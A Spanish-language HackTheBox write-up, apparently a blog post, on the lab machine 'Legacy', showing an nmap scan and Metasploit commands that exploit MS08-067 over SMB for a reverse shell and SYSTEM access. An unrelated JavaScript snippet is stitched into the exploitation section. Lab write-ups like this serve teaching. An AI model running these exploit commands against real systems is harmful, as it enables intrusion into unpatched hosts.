---
title: "Análisis de 'Legacy' en HTB"
slug: "legacy-htb"
description: "Un walkthrough completo de la explotación SMB con herramientas modernas."
category: "HackTheBox"
difficulty: "Fácil"
readTime: "12 min de lectura"
author: "@KrozFu"
date: "2024-01-15"
---

# Análisis de la máquina 'Legacy' en HackTheBox

Esta es una guía detallada de cómo explotar la famosa vulnerabilidad de SMB (MS08-067).

## Reconocimiento inicial

Primero, lanzamos un escaneo con nmap para descubrir puertos abiertos en la máquina objetivo:

```bash
nmap -sC -sV -p- 10.10.10.4 -oN escaneo_legacy.txt
```

> **Nota importante:** Siempre es buena práctica guardar el output de tus escaneos para no hacer ruido en la red repitiendo el proceso. Es una regla de oro en cualquier entorno de Red Team.

## Resultados del escaneo

Encontramos que el puerto 445 (SMB) está abierto y, debido a la antigüedad del sistema operativo, es vulnerable a:

- `ms08_067_netapi`
- Fácilmente explotable usando Metasploit Framework.

## Explotación

A continuación, abrimos `msfconsole` y configuramos el módulo del exploit con los parámetros necesarios para conseguir una reverse shell:

```ruby
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.10.10.4
set LHOST tun0
set LPORT 4444
exploit
```

```javascript
const a = 12;
var m = 1;
let f = 34;
console.log("Hello, World!");
```


Una vez ejecutado, conseguimos acceso como `NT AUTHORITY\SYSTEM`.